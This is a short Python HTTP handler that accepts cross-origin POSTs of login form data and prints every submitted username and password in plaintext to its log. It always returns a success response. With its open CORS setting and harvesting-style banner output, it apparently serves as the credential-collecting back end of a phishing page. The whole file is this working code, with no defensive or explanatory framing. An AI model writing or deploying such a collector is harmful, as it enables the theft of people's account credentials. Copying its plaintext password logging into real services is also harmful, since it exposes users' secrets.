import json
import sys
from http.server import BaseHTTPRequestHandler


class handler(BaseHTTPRequestHandler):

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        try:
            data = json.loads(body)
            print("=" * 50, flush=True)
            print("  LOGIN FORM SUBMISSION", flush=True)
            print("=" * 50, flush=True)
            print(f"  Username/Email: {data.get('username', '')}", flush=True)
            print(f"  Password:       {data.get('password', '')}", flush=True)
            print("=" * 50, flush=True)
        except Exception as e:
            print(f"[!] Failed to parse form data: {e}", flush=True)

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
